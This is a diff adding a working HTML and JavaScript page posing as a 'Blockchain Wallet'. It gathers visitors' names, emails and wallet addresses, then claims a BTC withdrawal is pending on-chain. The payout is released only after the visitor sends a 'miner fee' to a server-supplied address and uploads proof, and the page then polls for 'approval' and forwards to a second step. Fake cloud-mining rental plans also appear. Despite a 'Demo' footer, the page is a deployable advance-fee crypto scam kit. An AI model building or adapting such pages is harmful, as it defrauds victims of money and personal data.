@@ -1,0 +1,510 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Blockchain Wallet</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: Inter, sans-serif;
+            background: #f8fafc;
+            color: #0f172a;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        body.dark {
+            background: #0b0f19;
+            color: #e5e7eb;
+        }
+
+        .glass {
+            background: rgba(248, 250, 252, 0.95);
+            backdrop-filter: blur(14px);
+        }
+
+        body.dark .glass {
+            background: rgba(15, 23, 42, 0.95);
+        }
+
+        .modal-bg {
+            background: rgba(0, 0, 0, .8);
+        }
+
+        .btn-primary {
+            background: #2563eb;
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-yellow {
+            background: #f2c016;
+            color: #000;
+        }
+
+        .btn-yellow:hover {
+            background: #e3c500;
+        }
+
+        .card {
+            background: #e2e8f0;
+            border: 1px solid #cbd5e1;
+        }
+
+        body.dark .card {
+            background: #0f172a;
+            border: 1px solid #1e293b;
+        }
+
+        .animate-check {
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: drawCheck 0.8s forwards ease-in-out;
+        }
+
+        @keyframes drawCheck {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        .animate-fadeIn {
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        header,
+        footer {
+            width: 100%;
+            background: #f1f5f9;
+            padding: 1rem 2rem;
+        }
+
+        body.dark header,
+        body.dark footer {
+            background: #111827;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+
+    <!-- ================= HEADER ================= -->
+  <header class="sticky top-0 z-50 flex justify-between items-center px-4 py-3 
+               bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700">
+    <h1 class="text-xl font-bold text-blue-500">
+        Blockchain Wallet
+    </h1>
+
+    <h2 class="text-xl font-bold text-blue-500">
+        Balance: <span id="balanceDisplay3" class="font-bold"></span> BTC
+    </h2>
+
+    <!-- Dark Mode Icon Toggle -->
+    <button id="themeToggle"
+        class="p-2 rounded-full bg-slate-200 dark:bg-slate-700 
+               text-slate-800 dark:text-slate-200 hover:scale-105 transition"
+        aria-label="Toggle dark mode">
+
+        <!-- Sun Icon (Light Mode) -->
+        <svg id="sunIcon" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 hidden dark:block"
+            fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M12 3v2m0 14v2m9-9h-2M5 12H3m15.364-6.364l-1.414 1.414M7.05 16.95l-1.414 1.414M16.95 16.95l1.414 1.414M7.05 7.05L5.636 5.636M12 8a4 4 0 100 8 4 4 0 000-8z" />
+        </svg>
+
+        <!-- Moon Icon (Dark Mode) -->
+        <svg id="moonIcon" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 block dark:hidden"
+            fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M21 12.79A9 9 0 1111.21 3a7 7 0 009.79 9.79z" />
+        </svg>
+    </button>
+</header>
+
+
+    <!-- ================= MAIN ================= -->
+    <main class="flex-1 w-full max-w-6xl mx-auto p-6 flex flex-col items-center">
+
+        <!-- LOGIN MODAL -->
+        <div id="loginModal" class="fixed inset-0 modal-bg flex items-center justify-center z-50">
+            <div class="glass card rounded-2xl p-6 w-full max-w-md">
+                <h2 class="text-xl font-bold text-blue-400 mb-2">On-Chain Wallet Verification</h2>
+                <p class="text-sm text-slate-500 dark:text-slate-400 mb-4">
+                    Log in your wallet to review and process this transaction.
+                </p>
+
+                <input id="name" placeholder="Full Name"
+                    class="w-full mb-2 p-2 rounded bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700">
+                <input id="email" placeholder="Registered Email Address"
+                    class="w-full mb-2 p-2 rounded bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700">
+                <input id="wallet" placeholder="Receiving Wallet Address"
+                    class="w-full mb-2 p-2 rounded bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700">
+                <input id="walletType" placeholder="Wallet Name (BTC, ETH, USDT etc)"
+                    class="w-full mb-4 p-2 rounded bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700">
+
+                <button onclick="submitLogin()" class="btn-primary w-full py-2 rounded font-semibold">Secure
+                    Login</button>
+            </div>
+        </div>
+
+        <!-- APP -->
+        <div id="app" class="hidden w-full flex flex-col items-center space-y-6">
+
+            <!-- WAITING STEP / LOADER -->
+            <div id="stepWaiting" class="text-center mb-6 hidden">
+                <div
+                    class="w-16 h-16 border-4 border-slate-300 dark:border-slate-700 border-t-blue-500 rounded-full animate-spin mx-auto mb-4">
+                </div>
+                <p class="font-semibold text-lg">Checking your payment status…</p>
+                <p class="text-slate-500 dark:text-slate-400 mt-2">Please wait while we verify your transaction
+                    on-chain.</p>
+            </div>
+
+            <section id="stepDetails" class="hidden flex flex-col items-center justify-center  w-full">
+
+                <section class="mb-6 container mx-auto px-1 sm:px-4 w-full max-w-3xl">
+                    <div id="paymentBlock"
+                        class="payment-info p-6 bg-slate-200 dark:bg-slate-800 rounded-2xl shadow-md mx-auto text-gray-800 dark:text-gray-100 mt-8">
+
+                        <h1 class="text-2xl font-bold text-blue-400 mb-2">Withdrawal Request Detected</h1>
+                        <p class="text-slate-500 dark:text-slate-400 mb-4">
+                            Your withdrawal request has been detected on the blockchain and is pending on-chain
+                            authorization.
+                        </p>
+                        <p class="mb-4">
+                            To receive your payout to account <strong><span class="font-mono text-blue-600 break-all"
+                                    id="btcAddress"></span></strong> in the amount of
+                            <strong><span id="balanceDisplay"></span>&nbsp;BTC</strong>, please choose the option that
+                            suits
+                            you best:
+                        </p>
+                        <div class="bg-slate-100 dark:bg-slate-900 p-4 rounded-xl mb-4">
+                            <p class="text-xs text-slate-500 dark:text-slate-400">Receiving Wallet Address</p>
+                            <p id="walletDisplay" class="font-mono text-blue-400 break-all"></p>
+                        </div>
+
+                        <div class="bg-slate-100 dark:bg-slate-900 p-4 rounded-xl mb-6">
+                            <p class="text-xs text-slate-500 dark:text-slate-400">Available Balance</p>
+                            <p id="balanceDisplay2" class="text-xl font-bold text-blue-400"></p>BTC
+                        </div>
+
+                        <div class="payment-options flex flex-col md:flex-row gap-4 mb-6 w-full">
+                            <div
+                                class="option p-4 bg-white dark:bg-slate-900 rounded-lg shadow-inner border-l-4 border-yellow-400 flex-1">
+                                <p class="font-semibold mb-2">Express Withdrawal</p>
+                                <p class="text-sm mb-2">Instant processing after miner fee payment.</p>
+                                <p class="text-sm font-medium">Miner Fee: $<span id="fee1"></span></p>
+                                <button id="expressBtn" onclick="openPay('priorityFee')"
+                                    class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg mt-2 shadow w-full">
+                                    Pay Miner Fee & Get Instant Transfer
+                                </button>
+                            </div>
+
+                            <div
+                                class="option p-4 bg-white dark:bg-slate-900 rounded-lg shadow-inner border-l-4 border-blue-400 flex-1">
+                                <p class="font-semibold mb-2">Manual Withdrawal</p>
+                                <p class="text-sm mb-2">Processed manually within 1 hour after miner fee payment.</p>
+                                <p class="text-sm font-medium">Miner Fee: $<span id="fee2"></span> </p>
+                                <button id="manualBtn" onclick="openPay('standardFee')"
+                                    class="bg-yellow-500 hover:bg-yellow-600 text-white px-4 py-2 rounded-lg mt-2 shadow w-full">
+                                    Pay Miner Fee & Request Manual Transfer
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </section>
+
+            </section>
+
+            <!-- WITHDRAWAL DETAILS STEP -->
+            <div id="" class="hidden animate-fadeIn w-full">
+                <h1 class="text-2xl font-bold text-blue-400 mb-2">Withdrawal Request Detected</h1>
+                <p class="text-slate-500 dark:text-slate-400 mb-4">
+                    Your withdrawal request has been detected on the blockchain and is pending on-chain authorization.
+                </p>
+
+                <div class="bg-slate-200 dark:bg-slate-800 p-4 rounded-xl mb-4">
+                    <p class="text-xs text-slate-500 dark:text-slate-400">Receiving Wallet Address</p>
+                    <p id="walletDisplay" class="font-mono text-blue-400 break-all"></p>
+                </div>
+
+                <div class="bg-slate-200 dark:bg-slate-800 p-4 rounded-xl mb-6">
+                    <p class="text-xs text-slate-500 dark:text-slate-400">Available Balance</p>
+                    <p id="balanceDisplay" class="text-xl font-bold text-blue-400"></p> BTC
+                </div>
+
+                <div class="space-y-3 mb-6 w-full">
+                    <button onclick="openPay('priorityFee')" class="btn-primary w-full py-3 rounded-xl font-semibold">
+                        Express Withdrawal – Instant processing after fee
+                    </button>
+                    <button onclick="openPay('standardFee')"
+                        class="w-full bg-slate-300 dark:bg-slate-700 hover:bg-slate-400 dark:hover:bg-slate-600 py-3 rounded-xl font-semibold">
+                        Standard Withdrawal – Processed within 1 hour
+                    </button>
+                </div>
+
+
+                <!-- MINING PLANS -->
+                <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 w-full">
+
+                    <div class="bg-slate-100 dark:bg-slate-900 rounded-2xl shadow-lg p-6 flex flex-col justify-between">
+                        <div>
+                            <p class="font-semibold text-lg mb-2">START 1 Year</p>
+                            <h3 class="text-2xl font-bold mb-1">$307</h3>
+                            <p class="text-slate-500 dark:text-slate-400 mb-2">for 57.5 TH/s</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Investments: 307 USD</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Hashrate: 57.5 TH/s</p>
+                            <p class="text-blue-400 font-bold mb-2">0.00205 BTC</p>
+                        </div>
+                        <button class="btn-yellow w-full py-2 rounded-xl font-bold">RENT</button>
+                    </div>
+
+                    <div class="bg-slate-100 dark:bg-slate-900 rounded-2xl shadow-lg p-6 flex flex-col justify-between">
+                        <div>
+                            <p class="font-semibold text-lg mb-2">STANDARD 3 Years</p>
+                            <h3 class="text-2xl font-bold mb-1">$912</h3>
+                            <p class="text-slate-500 dark:text-slate-400 mb-2">for 64.7 TH/s</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Investments: 912 USD</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Hashrate: 64.7 TH/s</p>
+                            <p class="text-blue-400 font-bold mb-2">0.00645 BTC</p>
+                        </div>
+                        <button class="btn-yellow w-full py-2 rounded-xl font-bold">RENT</button>
+                    </div>
+
+                    <div class="bg-slate-100 dark:bg-slate-900 rounded-2xl shadow-lg p-6 flex flex-col justify-between">
+                        <div>
+                            <p class="font-semibold text-lg mb-2">GOLDEN 5 Years</p>
+                            <h3 class="text-2xl font-bold mb-1">$1488</h3>
+                            <p class="text-slate-500 dark:text-slate-400 mb-2">for 73.0 TH/s</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Investments: 1488 USD</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Hashrate: 73.0 TH/s</p>
+                            <p class="text-blue-400 font-bold mb-2">0.01125 BTC</p>
+                        </div>
+                        <button class="btn-yellow w-full py-2 rounded-xl font-bold">RENT</button>
+                    </div>
+
+                    <div class="bg-slate-100 dark:bg-slate-900 rounded-2xl shadow-lg p-6 flex flex-col justify-between">
+                        <div>
+                            <p class="font-semibold text-lg mb-2">PREMIUM 7 Years</p>
+                            <h3 class="text-2xl font-bold mb-1">$2041</h3>
+                            <p class="text-slate-500 dark:text-slate-400 mb-2">for 85.9 TH/s</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Investments: 2041 USD</p>
+                            <p class="text-slate-500 dark:text-slate-400 mb-1">Hashrate: 85.9 TH/s</p>
+                            <p class="text-blue-400 font-bold mb-2">0.01535 BTC</p>
+                        </div>
+                        <button class="btn-yellow w-full py-2 rounded-xl font-bold">RENT</button>
+                    </div>
+
+                </section>
+            </div>
+
+            <!-- PAYMENT MODAL -->
+            <div id="payModal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-50">
+                <div class="glass card rounded-2xl p-6 w-full max-w-md">
+                    <h2 class="text-lg font-semibold mb-2">Complete Miner Fee</h2>
+                    <p class="text-sm text-slate-500 dark:text-slate-400 mb-4">
+                        Send the required miner fee to the address below and upload proof of payment.
+                    </p>
+                    <div class="bg-slate-200 dark:bg-slate-800 p-3 rounded-xl mb-3 flex items-center justify-between">
+                        <div>
+                            <p class="text-xs text-slate-500 dark:text-slate-400">Miner Fee Address</p>
+                            <p id="payWallet" class="font-mono text-blue-400 break-all"></p>
+                        </div>
+                        <button id="copyWallet" class="btn-primary text-xs px-2 py-1 rounded">Copy</button>
+                    </div>
+                    <div class="flex justify-between text-sm mb-4">
+                        <span>Required Fee</span>
+                        <span id="feeAmount" class="font-semibold"></span>
+                    </div>
+                    <input id="proof" type="file" class="w-full bg-slate-200 dark:bg-slate-800 p-2 rounded mb-3">
+                    <button onclick="submitPayment()" class="btn-primary w-full py-2 rounded-xl">Confirm
+                        Payment</button>
+                    <button onclick="closePay()"
+                        class="w-full text-xs text-slate-500 dark:text-slate-400 mt-3">Cancel</button>
+                </div>
+            </div>
+
+            <!-- SVG CHECKMARK MODAL -->
+            <div id="checkModal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-50">
+                <div class="glass card rounded-2xl p-6 w-64 flex flex-col items-center">
+                    <svg class="w-20 h-20 mb-4" viewBox="0 0 52 52">
+                        <circle cx="26" cy="26" r="25" fill="none" stroke="#2563eb" stroke-width="2" />
+                        <path class="animate-check" fill="none" stroke="#22c55e" stroke-width="4"
+                            d="M14 27l7 7 16-16" />
+                    </svg>
+                    <h2 class="text-lg font-semibold text-blue-400 mb-2">Payment Submitted</h2>
+                    <p class="text-sm text-slate-500 dark:text-slate-400 text-center">Your transaction is now awaiting
+                        on-chain confirmation.</p>
+                    <button onclick="closeCheck()" class="mt-4 btn-primary w-full py-2 rounded-xl">Close</button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="text-center text-sm text-slate-500 dark:text-slate-400">
+        &copy; 2026 Blockchain Wallet Demo. All rights reserved.
+    </footer>
+
+    <script>
+        let UID = null;
+        let CONFIG = null;
+        let CURRENT_TYPE = null;
+        const STEP_CHECK_INTERVAL = 2000; // 2s polling
+
+        const walletDisplay = document.getElementById('walletDisplay');
+        const balanceDisplay = document.getElementById('balanceDisplay');
+        const balanceDisplay2 = document.getElementById('balanceDisplay2');
+        const balanceDisplay3 = document.getElementById('balanceDisplay3');
+        const fee1 = document.getElementById('fee1');
+        const fee2 = document.getElementById('fee2');
+
+        const stepWaiting = document.getElementById('stepWaiting');
+        const stepDetails = document.getElementById('stepDetails');
+        const app = document.getElementById('app');
+        const loginModal = document.getElementById('loginModal');
+        const payModal = document.getElementById('payModal');
+        const checkModal = document.getElementById('checkModal');
+
+        const themeToggle = document.getElementById('themeToggle');
+        themeToggle.addEventListener('click', () => document.body.classList.toggle('dark'));
+
+        window.addEventListener('load', async () => {
+            const storedUser = localStorage.getItem('uid');
+            if (storedUser) {
+                UID = storedUser;
+                await loadConfig();
+                console.log(CONFIG)
+                walletDisplay.textContent = localStorage.getItem('wallet') || '';
+                balanceDisplay.textContent = CONFIG.balance;
+                balanceDisplay2.textContent = CONFIG.balance;
+                balanceDisplay3.textContent = CONFIG.balance;
+                fee1.textContent = CONFIG.priorityFee;
+                fee2.textContent = CONFIG.standardFee;
+                loginModal.classList.add('hidden');
+                app.classList.remove('hidden');
+
+                checkPaymentApproval();
+            }
+        });
+
+        async function submitLogin() {
+            const payload = {
+                name: name.value,
+                email: email.value,
+                wallet: wallet.value,
+                walletType: walletType.value
+            };
+            const res = await fetch("/api/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            const data = await res.json();
+            UID = data.uid;
+            localStorage.setItem("uid", UID);
+            localStorage.setItem("wallet", payload.wallet);
+            await loadConfig();
+            walletDisplay.textContent = payload.wallet;
+            balanceDisplay.textContent = CONFIG.balance;
+            loginModal.classList.add("hidden");
+            app.classList.remove("hidden");
+
+            checkPaymentApproval();
+        }
+
+        async function loadConfig() {
+            const res = await fetch("/api/config");
+            CONFIG = await res.json();
+        }
+
+        function openPay(type) {
+            CURRENT_TYPE = type;
+            let fee = (type === "priorityFee" ? CONFIG.priorityFee : CONFIG.standardFee);
+            payWallet.textContent = CONFIG.walletAddress;
+            feeAmount.textContent = "$" + fee;
+            payModal.classList.remove("hidden");
+        }
+
+        document.getElementById('copyWallet').addEventListener('click', () => {
+            navigator.clipboard.writeText(CONFIG.walletAddress);
+            alert("Wallet address copied!");
+        });
+
+        function closePay() { payModal.classList.add("hidden"); }
+        function closeCheck() { checkModal.classList.add("hidden"); }
+
+        async function submitPayment() {
+            const proofInput = document.getElementById('proof');
+            const file = proofInput.files[0];
+            if (!file) return alert("Upload proof");
+
+            const fd = new FormData();
+            fd.append("uid", UID);
+            fd.append("type", CURRENT_TYPE);
+            fd.append("proof", file);
+
+            await fetch("/api/pay", { method: "POST", body: fd });
+
+            payModal.classList.add('hidden');
+            checkModal.classList.remove('hidden');
+
+            // Start polling for approval
+            stepDetails.classList.add('hidden');
+            stepWaiting.classList.remove('hidden');
+            pollApproval();
+        }
+
+        function pollApproval() {
+            const interval = setInterval(async () => {
+                const res = await fetch(`/api/status/${UID}`);
+                const data = await res.json();
+                if (data.approved) {
+                    clearInterval(interval);
+                    // Redirect to Step 2 page
+                    window.location.href = "/step2.html";
+                }
+            }, STEP_CHECK_INTERVAL);
+        }
+
+        async function checkPaymentApproval() {
+            stepWaiting.classList.remove('hidden');
+            stepDetails.classList.add('hidden');
+
+            const res = await fetch(`/api/status/${UID}`);
+            const data = await res.json();
+
+            console.log(data)
+            if (data.approved) {
+                window.location.href = "/step2.html";
+            } else {
+                stepWaiting.classList.add('hidden');
+                stepDetails.classList.remove('hidden');
+            }
+        }
+    </script>
+
+</body>
+
+</html>
